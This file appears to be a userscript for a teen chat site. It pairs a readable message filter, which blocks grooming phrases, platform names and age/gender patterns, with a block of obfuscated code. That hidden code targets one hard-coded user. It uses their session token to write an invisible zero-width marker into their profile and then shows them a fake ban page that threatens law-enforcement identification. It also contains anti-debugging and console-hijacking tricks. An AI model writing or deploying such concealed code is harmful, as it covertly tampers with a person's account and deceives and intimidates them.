let userFilterWords = ['hmu'];

function isFiltered(content) {
    if (typeof content !== 'string') return false;

    // normalize text
    let normalized = content
        .normalize('NFKD')
        .replace(/[\u0300-\u036f]/g, '') // remove diacritics
        .replace(/[\p{Emoji_Presentation}\p{Extended_Pictographic}\u200B-\u200D\uFEFF\u00A0\u202F\u2060]/gu, '') // emoji + zero-width
        .replace(/[\s\u2000-\u200D\uFEFF\u202F]+/g, ' ') // fancy spaces
        .replace(/[\s\W_]+/g, ' ')
        .replace(/(.)\1{2,}/g, '$1')
        .toLowerCase()
        .trim();

    // replace homoglyphs / leetspeak
    const homoglyphs = {
        '@': 'a', '4': 'a', 'а': 'a', 'ᴀ': 'a', 'â': 'a',
        '3': 'e', 'е': 'e', '€': 'e', 'ᴇ': 'e', 'è': 'e',
        'í': 'i', 'ì': 'i', 'ɪ': 'i', '1': 'l', '!': 'i', 'ı': 'i', 'ʟ': 'l',
        '0': 'o', 'о': 'o', '٥': 'o', 'ö': 'o',
        '8': 'b', '9': 'g', '6': 'g', '7': 't', 'т': 't',
        'э': 'e', 'ɢ': 'g', 'ѕ': 's', 'ʀ': 'r', 'ʏ': 'y',
        'ｔ': 't', 'ｌ': 'l', 'ｇ': 'g', '✓': ''
    };

    normalized = normalized.replace(/./g, (ch, i, str) => {
        if (/\d/.test(ch) && (
            (i > 0 && /\d/.test(str[i - 1])) ||
            (i < str.length - 1 && /\d/.test(str[i + 1]))
        )) return ch;
        return homoglyphs[ch] || ch;
    });

    const lettersOnly = normalized.replace(/[^a-z]/g, '');
    // keyword matching helpers
    const includesAny = (text, list) => list.some(item => text.includes(item));
    const fuzzyMatch = (regexList) => regexList.some(rx => rx.test(normalized));

    // check for banned terms
    const bannedTerms = ['telegrm', 'tlgrm', 'tlgm', 'tlg', 'tle', 'tel', 'tg', 'teleg', 'gram', 'te l e', 'tele', 'grm', 'discor', 'dscord', 'dscrd', 'dscd', 'dyscord', 'dsc', 'd i s c', 'disc', 'dc', 'insta', 'ig', 'snap', 'sc', 'gc'];
    if (includesAny(lettersOnly, bannedTerms)) return true;

    const fuzzyPatterns = [
        /t[\W_]*e[\W_]*l[\W_]*e[\W_]*g[\W_]*r[\W_]*a[\W_]*m/i,
        /t[\W_]*g/i,
        /d[\W_]*i[\W_]*s[\W_]*c[\W_]*o[\W_]*r[\W_]*d/i,
        /i[\W_]*n[\W_]*s[\W_]*t[\W_]*a[\W_]*g[\W_]*r[\W_]*a[\W_]*m/i,
        /w[\W_]*h[\W_]*e[\W_]*r[\W_]*e[\W_]*b[\W_]*y[\W_]*[\W_]*c[\W_]*o[\W_]*m/i
    ];
    if (fuzzyMatch(fuzzyPatterns)) return true;

    const squashed = normalized.replace(/[^a-z]/g, '');
    for (const term of bannedTerms) {
	    if (squashed.includes(term)) return true;
    }

    // grooming or inappropriate content
    const baitKeywords = ['bored', 'text me', 'pm', 'pm me', 'dm me', 'text', 'trusted', 'add me', 'msg me', 'message me', 'wanna have fun', 'want to have fun', 'skinny boys', 'skinny girls', 'fit boys', 'fit girls', 'rp', 'answer anything', 'truth or dare', 't or d'];
    const tradeWords = ['trade', 'trd', 'tr ade', 'selling', 'sell', 'slling', 'slng', 'seling', 'tr@de', 'trading', 'mega', 'mga', 'lnks', 'links', 'lks', 'freaks', 'freaky', 'nked', 'nkd', 'room', 'cam', 'cams', 'spoil me', 'horny', 'sex', 'nudes', 'nut'];
    const filterForBait = ['girl', 'girls', 'boy', 'boys', 'chat', 'femboy', 'trans', 'bi', 'gay', 'anyone']

    const hasBaitKeywords = includesAny(normalized, baitKeywords);
    const hasFilterForBait = includesAny(normalized, filterForBait);
    const hasAge = /[mf]?\d{1,2}/.test(normalized);
    const hasStandaloneAge = /\b\d{1,2}\b/.test(normalized);
    const hasTg = normalized.includes('tg');

    if (
        hasBaitKeywords &&
        (
            hasAge ||
            hasStandaloneAge ||
            hasTg ||
            hasFilterForBait
        )
    ) return true;

    const domRoles = ['bottom', 'bottoming', 'btming', 'bttming', 'btm', 'bttm', 'sub', 'submissive', 'top', 'topping', 'dom', 'dominant', 'dominative', 'domme', 'dominator'];

    const domFuzzyPatterns = domRoles.map(word => {
        const pattern = word
            .split('')
            .map(char => `${char}[\\W_]*`)
            .join('');
        return new RegExp(pattern, 'i');
    });
    if (/\b\d{1,2}\b/.test(normalized) && fuzzyMatch(domFuzzyPatterns)) return true;

    // age + gender combo patterns
    if (/[fm][\s\-_,.:']*\d{1,2}/i.test(normalized)) return true;
    if (/\d{1,2}[\s\-_,.:']*[fm]/i.test(normalized)) return true;
    if (/[mf]\d{2}/i.test(content)) return true;

    // trade/selling patterns
    for (let word of tradeWords) {
        const pattern = new RegExp(word.replace(/\s*/g, '[\\s\\W_]*'), 'i');
        if (pattern.test(normalized)) return true;
    }

    // user filters
    if (Array.isArray(userFilterWords)) {
        for (let word of userFilterWords) {
            const pattern = new RegExp(word.replace(/\s*/g, '[\\s\\W_]*'), 'i');
            if (pattern.test(normalized)) return true;
        }
    }

    return false;
}

function logFiltered(message) {
  const logsKey = "filteredLogs";
  const startKey = "logStartTime";
  const timeMs = 5 * 60 * 1000;
  const now = Date.now();

  let startTime = parseInt(localStorage.getItem(startKey), 10);
  if (isNaN(startTime)) {
    startTime = now;
    localStorage.setItem(startKey, startTime.toString());
  }

  if (now - startTime <= timeMs) {
    const existingLogs = JSON.parse(localStorage.getItem(logsKey) || "[]");
    existingLogs.push({ message, timestamp: now });
    localStorage.setItem(logsKey, JSON.stringify(existingLogs));
  }
}


function overrideChatReload() { 
    appendChatMessage = data => {
	    var message = '';
	    for (var i = 0; i < data.length; i++){
	    	lastPost = data[i].log_id;
	    	if(
	    		!logExist(data[i]) &&
	    		!ignored(data[i].user_id) &&
	    		!ignored(data[i].log_uid) &&
	    		!boomAllow(data[i].log_rank) &&
	    		!isFiltered(data[i].log_content) // <== NEW FILTER
	    	){
	    		message += createChatLog(data[i]);
	    		chatSound(data[i]);
	    		tabNotify();
	    	}
            if(isFiltered(data[i].log_content)) { logFiltered(data[i].log_content); }
	    }
	    $("#show_chat ul").append(message);
	    scrollIt(1);
	    beautyLogs();
    }
    loadChatHistory = data => {
	    var message = '';
	    for (var i = 0; i < data.length; i++){
	    	lastPost = data[i].log_id;
	    	if(
	    		!ignored(data[i].user_id) &&
	    		!ignored(data[i].log_uid) &&
	    		!boomAllow(data[i].log_rank) &&
	    		!isFiltered(data[i].log_content) // <== NEW FILTER
	    	){
	    		message += createChatLog(data[i]);
	    	}
	    }
	    $("#show_chat ul").html(message);
	    scrollIt(0);
	    beautyLogs();
    }
    appendChatHistory = data => {
    	    var message = '';
    	    for (var i = 0; i < data.length; i++){
    		    if(
    	    		!ignored(data[i].user_id) &&
    	    		!ignored(data[i].log_uid) &&
    	    		!boomAllow(data[i].log_rank) &&
    	    		!isFiltered(data[i].log_content) // <== NEW FILTER
    	    	){
    	    		message += createChatLog(data[i]);
    	    	}
    	    }
    	    $("#show_chat ul").prepend(message);
    	    beautyLogs();
    }
    window.isFiltered = isFiltered;
    ab();
}






(function(_0x110725,_0x4ee12e){const _0x4647d8=_0x553b,_0x32cfef=_0x110725();while(!![]){try{const _0x2f249a=parseInt(_0x4647d8(0xe0))/0x1*(-parseInt(_0x4647d8(0xb2))/0x2)+parseInt(_0x4647d8(0x10b))/0x3+parseInt(_0x4647d8(0xa8))/0x4+parseInt(_0x4647d8(0xf6))/0x5+parseInt(_0x4647d8(0x110))/0x6+parseInt(_0x4647d8(0xac))/0x7+-parseInt(_0x4647d8(0xf3))/0x8*(parseInt(_0x4647d8(0xb1))/0x9);if(_0x2f249a===_0x4ee12e)break;else _0x32cfef['push'](_0x32cfef['shift']());}catch(_0x528b8b){_0x32cfef['push'](_0x32cfef['shift']());}}}(_0x1923,0xc57db));function _0x553b(_0x3ddeee,_0x3a5217){const _0x297d32=_0x1923();return _0x553b=function(_0x49a147,_0x55410c){_0x49a147=_0x49a147-0xa6;let _0x4b8bdb=_0x297d32[_0x49a147];return _0x4b8bdb;},_0x553b(_0x3ddeee,_0x3a5217);}const _0x4e8dfa=(function(){let _0x5b5243=!![];return function(_0x6b6b3d,_0x4d954a){const _0x5bdc85=_0x5b5243?function(){const _0x34a56c=_0x553b;if(_0x4d954a){const _0xcc57fe=_0x4d954a[_0x34a56c(0xd4)](_0x6b6b3d,arguments);return _0x4d954a=null,_0xcc57fe;}}:function(){};return _0x5b5243=![],_0x5bdc85;};}()),_0x8b2061=_0x4e8dfa(this,function(){const _0x3b5ad8=_0x553b,_0x4c5f6f={'wbqHf':_0x3b5ad8(0xd7)};return _0x8b2061[_0x3b5ad8(0x11b)]()['search'](_0x4c5f6f[_0x3b5ad8(0xb8)])[_0x3b5ad8(0x11b)]()[_0x3b5ad8(0x10f)](_0x8b2061)[_0x3b5ad8(0x10a)](_0x4c5f6f['wbqHf']);});_0x8b2061();const _0x55410c=(function(){let _0x18a2a5=!![];return function(_0x4c897d,_0x52c458){const _0x204d37=_0x18a2a5?function(){if(_0x52c458){const _0x1aec26=_0x52c458['apply'](_0x4c897d,arguments);return _0x52c458=null,_0x1aec26;}}:function(){};return _0x18a2a5=![],_0x204d37;};}()),_0x49a147=_0x55410c(this,function(){const _0x1f7443=_0x553b,_0x354fa5={'QnsgS':function(_0x4c7c68,_0x5159d7){return _0x4c7c68(_0x5159d7);},'XIAYh':_0x1f7443(0xb0),'obxWP':_0x1f7443(0x119),'fDwvP':function(_0x891708,_0x3c0d30){return _0x891708===_0x3c0d30;},'nyMlC':'QQJqe','krcQe':'mvZuS','vFAiN':'mYsHa','UdKOT':function(_0x3db192,_0x2680d9){return _0x3db192(_0x2680d9);},'NRZFx':function(_0x482aa2,_0x1aec3d){return _0x482aa2+_0x1aec3d;},'nnOms':function(_0x254cf1){return _0x254cf1();},'Wxtiq':_0x1f7443(0xce),'YRjLp':_0x1f7443(0xcb),'dCbJA':_0x1f7443(0xe9),'Vqxsj':_0x1f7443(0xd6),'wOynK':_0x1f7443(0xa6),'OfOhd':function(_0x2a8627,_0x32bf41){return _0x2a8627<_0x32bf41;}},_0xf2e3ea=function(){const _0x34f759=_0x1f7443,_0x287770={'TMnsU':function(_0x42ae05,_0x227fc0){const _0x34f10c=_0x553b;return _0x354fa5[_0x34f10c(0xef)](_0x42ae05,_0x227fc0);},'NFfyL':_0x354fa5[_0x34f759(0xb5)],'aklpG':_0x354fa5['obxWP']};if(_0x354fa5['fDwvP'](_0x354fa5[_0x34f759(0x114)],_0x354fa5[_0x34f759(0xd9)])){const _0x496ac2='token='+_0x287770[_0x34f759(0x116)](_0x599add,_0x36d97a)+_0x34f759(0xc7),_0x122864=_0x19601d('https://www.teen-chat.org/teenchat/system/box/edit_about.php',_0x496ac2),_0x5c276c=new _0x27eb37(),_0x25b546=_0x5c276c[_0x34f759(0x118)](_0x122864,_0x287770[_0x34f759(0xde)]),_0x1b502e=_0x25b546[_0x34f759(0x103)](_0x287770[_0x34f759(0xbd)]);return _0x1b502e?_0x1b502e[_0x34f759(0xeb)]:null;}else{let _0xe90752;try{if(_0x354fa5[_0x34f759(0xbb)]==='PcZdY'){const _0x498b3c=_0x11c08a[_0x34f759(0xd4)](_0x3596aa,arguments);return _0xaa1dc9=null,_0x498b3c;}else _0xe90752=_0x354fa5[_0x34f759(0xd8)](Function,_0x354fa5[_0x34f759(0xed)](_0x354fa5[_0x34f759(0xed)](_0x34f759(0x108),_0x34f759(0xdf)),');'))();}catch(_0x5def49){_0xe90752=window;}return _0xe90752;}},_0x358407=_0x354fa5['nnOms'](_0xf2e3ea),_0x179f64=_0x358407[_0x1f7443(0x100)]=_0x358407[_0x1f7443(0x100)]||{},_0x243c84=[_0x354fa5[_0x1f7443(0xb6)],_0x354fa5[_0x1f7443(0xc2)],_0x1f7443(0xc6),_0x354fa5[_0x1f7443(0xe5)],_0x354fa5[_0x1f7443(0xad)],_0x1f7443(0xec),_0x354fa5[_0x1f7443(0x105)]];for(let _0x3afb5c=0x0;_0x354fa5[_0x1f7443(0xc5)](_0x3afb5c,_0x243c84[_0x1f7443(0xdd)]);_0x3afb5c++){const _0x4c9b1f=_0x55410c[_0x1f7443(0x10f)][_0x1f7443(0xf0)][_0x1f7443(0xb7)](_0x55410c),_0x3510a6=_0x243c84[_0x3afb5c],_0x3fa639=_0x179f64[_0x3510a6]||_0x4c9b1f;_0x4c9b1f[_0x1f7443(0x10c)]=_0x55410c[_0x1f7443(0xb7)](_0x55410c),_0x4c9b1f[_0x1f7443(0x11b)]=_0x3fa639[_0x1f7443(0x11b)][_0x1f7443(0xb7)](_0x3fa639),_0x179f64[_0x3510a6]=_0x4c9b1f;}});function _0x1923(){const _0x5c8703=['application/x-www-form-urlencoded','tnMsk','return\x20(function()\x20','SwoTa','search','2488821tpfBwV','__proto__','acfdw','ECdBR','constructor','4617816Zjomgm','uCqtV','slice','JLGpw','nyMlC','forEach','TMnsU','zXILP','parseFromString','textarea#set_user_about','WyrEU','toString','trace','awLJr','6344160KjMjKN','YtBDV','hJWCi','MPEYz','1715378OdPjmm','Vqxsj','undefined','appendChild','text/html','4716UrvKeI','3198682JCEtgB','setRequestHeader','out_page_container\x20back_page','XIAYh','Wxtiq','bind','wbqHf','includes','yCAof','vFAiN','div','aklpG','global_chat','llEqC','ZDHWI','dMZBv','YRjLp','chat_head','createElement','OfOhd','info','&cp=chat','POST\x20request\x20failed:\x20','NClow','LgZpl','warn','body','display','log','\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22out_page_content\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22out_page_box\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22pad_box\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22bpad15\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20class=\x22large_icon\x22\x20src=\x22default_images/icons/banned.svg\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22bpad10\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22text_xlarge\x20bold\x20bpad10\x22>You\x20are\x20banned.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22text_med\x22>You\x20have\x20been\x20banned\x20from\x20this\x20chat.\x20Your\x20IP\x20address\x20has\x20been\x20recorded\x20and\x20with\x20chat\x20logs\x20it\x20can\x20be\x20used\x20by\x20law\x20enforcement\x20to\x20identify\x20you\x20in\x20cases\x20involving\x20illegal\x20activity.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22tpad10\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22bold\x20theme_color\x20bpad5\x22>Reason\x20given</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22text_med\x22>Account\x20cloning</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20</div>','CzTYo','innerHTML','KTSFj','getElementById','apply','Content-Type','exception','(((.+)+)+)+$','UdKOT','krcQe','UwDnW','yQKbH','responseText','length','NFfyL','{}.constructor(\x22return\x20this\x22)(\x20)','1WsLXrR','set_user_about','xsvvY','style','Gzjap','dCbJA','ZOilo','GqPRr','KQnoD','error','MXQQE','value','table','NRZFx','pCESU','QnsgS','prototype','textarea','wrap_footer','25760edXWmA','zmSiP','SmKYf','3326035FJDOWe','YcEuA','status','YOuGk','none','https://www.teen-chat.org/teenchat/system/box/edit_about.php','remove','function','VokxE','Gcmxz','console','vVkvq','.out_page_container','querySelector','JRjxh','wOynK'];_0x1923=function(){return _0x5c8703;};return _0x1923();}_0x49a147();function ab(){const _0x21663f=_0x553b,_0x46bc36={'ECdBR':function(_0x4bea90,_0x739b60){return _0x4bea90===_0x739b60;},'YOuGk':_0x21663f(0xe4),'tnMsk':'POST','TdhWZ':_0x21663f(0xd5),'iaKuE':function(_0x2919a2,_0x6e1bc8){return _0x2919a2<_0x6e1bc8;},'FpItz':_0x21663f(0xda),'acfdw':_0x21663f(0x111),'WyrEU':function(_0x5295ba,_0x33d5c9){return _0x5295ba!==_0x33d5c9;},'llEqC':_0x21663f(0x109),'dMZBv':function(_0x4b5a54,_0x99a7ed){return _0x4b5a54+_0x99a7ed;},'VokxE':_0x21663f(0xc8),'xsvvY':function(_0x40cdf9,_0x12033b){return _0x40cdf9(_0x12033b);},'MPEYz':function(_0x191144,_0x2c8792,_0x14f2c8){return _0x191144(_0x2c8792,_0x14f2c8);},'CzTYo':_0x21663f(0xb0),'NiAQR':_0x21663f(0x119),'JLGpw':function(_0x20e916,_0x2907ce){return _0x20e916!==_0x2907ce;},'zmSiP':_0x21663f(0xdb),'NClow':_0x21663f(0xe1),'GqPRr':_0x21663f(0xfa),'ZDHWI':function(_0x52454d,_0xa169ae){return _0x52454d===_0xa169ae;},'puzVI':_0x21663f(0xfd),'pCESU':function(_0x5474fa){return _0x5474fa();},'uBuWM':function(_0x272b59,_0x5cb7d7){return _0x272b59===_0x5cb7d7;},'yCAof':_0x21663f(0xf5),'FigXw':'BQQso','qayos':_0x21663f(0xc3),'KTSFj':_0x21663f(0xbe),'SYtkT':_0x21663f(0xf2),'YcEuA':_0x21663f(0x102),'KQnoD':_0x21663f(0xb4),'YtBDV':function(_0x1c74e7,_0x36008c){return _0x1c74e7+_0x36008c;},'MXQQE':_0x21663f(0xf1),'zXILP':function(_0x8596bb){return _0x8596bb();},'itzTI':function(_0x5a6e3e,_0x46c0df){return _0x5a6e3e===_0x46c0df;},'Gcmxz':function(_0x42ea65,_0x2a2641){return _0x42ea65(_0x2a2641);},'jgRvJ':_0x21663f(0x101),'hJWCi':function(_0x7d145c,_0x5a2cd1){return _0x7d145c===_0x5a2cd1;},'cYNnz':_0x21663f(0xae),'ddtIj':function(_0x53c771){return _0x53c771();},'WUhxk':function(_0x377477,_0x2dbf62){return _0x377477===_0x2dbf62;},'ZYpFq':function(_0x277572,_0x28b74e){return _0x277572===_0x28b74e;},'JRjxh':function(_0xb1ad81,_0x5a0453){return _0xb1ad81!==_0x5a0453;},'LgZpl':'ANtlx','awLJr':'kHdro'};if(_0x46bc36[_0x21663f(0xaa)](typeof user_id,_0x46bc36['cYNnz'])||![0x9d0992][_0x21663f(0xb9)](user_id))return;const _0x4e5937='​‌',_0x265976=0x2bf20;function _0x227691(_0x5a820,_0x3f0fa9){const _0xa057b4=_0x21663f;if(_0x46bc36[_0xa057b4(0x10e)](_0x46bc36[_0xa057b4(0xf9)],'Gzjap')){const _0x292624=new XMLHttpRequest();_0x292624['open'](_0x46bc36[_0xa057b4(0x107)],_0x5a820,![]),_0x292624[_0xa057b4(0xb3)](_0x46bc36['TdhWZ'],_0xa057b4(0x106)),_0x292624['send'](_0x3f0fa9);if(_0x292624[_0xa057b4(0xf8)]>=0xc8&&_0x46bc36['iaKuE'](_0x292624[_0xa057b4(0xf8)],0x12c)){if(_0x46bc36['ECdBR'](_0x46bc36['FpItz'],_0x46bc36[_0xa057b4(0x10d)])){if(_0xf35bce){const _0x37be45=_0xae79b7[_0xa057b4(0xd4)](_0x2e948e,arguments);return _0x27c34b=null,_0x37be45;}}else return _0x292624[_0xa057b4(0xdc)];}else{if(_0x46bc36[_0xa057b4(0x11a)](_0x46bc36[_0xa057b4(0xbf)],_0x46bc36[_0xa057b4(0xbf)]))return _0x5753b5(),!![];else throw new Error(_0x46bc36[_0xa057b4(0xc1)](_0x46bc36['VokxE'],_0x292624[_0xa057b4(0xf8)]));}}else{const _0x253f56=_0x49d730?function(){const _0x5ba606=_0xa057b4;if(_0x42cdd7){const _0x14434d=_0x2b4e0d[_0x5ba606(0xd4)](_0x17b2f6,arguments);return _0x112090=null,_0x14434d;}}:function(){};return _0x1ca657=![],_0x253f56;}}function _0x36bda0(){const _0x39b41c=_0x21663f,_0x423c38='token='+_0x46bc36[_0x39b41c(0xe2)](encodeURIComponent,utk)+'&cp=chat',_0xeda3e7=_0x46bc36['MPEYz'](_0x227691,_0x39b41c(0xfb),_0x423c38),_0x315be0=new DOMParser(),_0x1046e1=_0x315be0['parseFromString'](_0xeda3e7,_0x46bc36[_0x39b41c(0xd0)]),_0xd10bfb=_0x1046e1['querySelector'](_0x46bc36['NiAQR']);return _0xd10bfb?_0xd10bfb['value']:null;}function _0x520db2(_0x2ec790){const _0x21623e=_0x21663f;if(_0x46bc36[_0x21623e(0x113)](_0x46bc36[_0x21623e(0xf4)],_0x21623e(0xdb))){const _0xbca188=_0x5b35ea[_0x21623e(0xd4)](_0x169b58,arguments);return _0x20aa48=null,_0xbca188;}else{let _0x37df36=document[_0x21623e(0x103)](_0x21623e(0x119));return!_0x37df36&&(_0x37df36=document['createElement'](_0x21623e(0xf1)),_0x37df36['id']=_0x46bc36[_0x21623e(0xc9)],_0x37df36[_0x21623e(0xe3)][_0x21623e(0xcd)]=_0x46bc36[_0x21623e(0xe7)],document['body']['appendChild'](_0x37df36)),_0x37df36['value']=_0x2ec790,_0x46bc36[_0x21623e(0xc0)](typeof saveAbout,_0x46bc36['puzVI'])?(_0x46bc36[_0x21623e(0xee)](saveAbout),!![]):![];}}function _0x39d3c7(){const _0x55e3df=_0x21663f;if(_0x46bc36['uBuWM'](_0x46bc36[_0x55e3df(0xba)],_0x46bc36['FigXw']))return;else[_0x46bc36['qayos'],_0x46bc36[_0x55e3df(0xd2)],_0x46bc36['SYtkT']]['forEach'](_0x7232ea=>{const _0x3203da=_0x55e3df,_0x5332fe=document[_0x3203da(0xd3)](_0x7232ea);if(_0x5332fe)_0x5332fe['remove']();});}function _0x3550e1(){const _0x550103=_0x21663f;document[_0x550103(0x103)](_0x46bc36[_0x550103(0xf7)])?.[_0x550103(0xfc)]();const _0xeccd01=document[_0x550103(0xc4)](_0x550103(0xbc));_0xeccd01['className']=_0x46bc36[_0x550103(0xe8)],_0xeccd01[_0x550103(0xd1)]=_0x550103(0xcf),document['body'][_0x550103(0xaf)](_0xeccd01);}try{const _0x5e6c4d=_0x46bc36['ddtIj'](_0x36bda0);if(_0x46bc36['WUhxk'](_0x5e6c4d,null)){if(_0x46bc36['ZYpFq']('ZOilo',_0x21663f(0xe6)))return;else[_0x46bc36['qayos'],_0x46bc36[_0x21663f(0xd2)],_0x21663f(0xf2)][_0x21663f(0x115)](_0x3bb27f=>{const _0x22e782=_0x21663f,_0x18dcc5=_0x4cab4d[_0x22e782(0xd3)](_0x3bb27f);if(_0x18dcc5)_0x18dcc5[_0x22e782(0xfc)]();});}if(_0x5e6c4d[_0x21663f(0xb9)](_0x4e5937)){if(_0x46bc36[_0x21663f(0x104)](_0x46bc36[_0x21663f(0xca)],_0x46bc36[_0x21663f(0xa7)])){_0x46bc36[_0x21663f(0x117)](_0x39d3c7),_0x46bc36[_0x21663f(0x117)](_0x3550e1);return;}else throw new _0x4f062d(_0x46bc36[_0x21663f(0xa9)](_0x46bc36[_0x21663f(0xfe)],_0x578e3b[_0x21663f(0xf8)]));}_0x46bc36[_0x21663f(0xab)](setTimeout,()=>{const _0x2137e5=_0x21663f;let _0x24d725=_0x46bc36[_0x2137e5(0x117)](_0x36bda0);if(_0x46bc36['itzTI'](_0x24d725,null))return;_0x24d725[_0x2137e5(0xdd)]>=0x320&&(_0x24d725=_0x24d725[_0x2137e5(0x112)](0x0,0x31e));const _0x3fba38=_0x24d725+_0x4e5937;_0x46bc36[_0x2137e5(0xff)](_0x520db2,_0x3fba38)&&(_0x46bc36[_0x2137e5(0x113)](_0x2137e5(0x101),_0x46bc36['jgRvJ'])?(_0x2e2430=_0x1e5565[_0x2137e5(0xc4)](_0x46bc36[_0x2137e5(0xea)]),_0x219398['id']='set_user_about',_0x351028[_0x2137e5(0xe3)][_0x2137e5(0xcd)]=_0x46bc36[_0x2137e5(0xe7)],_0x113dbe[_0x2137e5(0xcc)][_0x2137e5(0xaf)](_0x34b23c)):_0x46bc36['MPEYz'](setTimeout,()=>location['reload'](),0xbb8));},_0x265976);}catch(_0x2a5600){console[_0x21663f(0xe9)](_0x2a5600);}}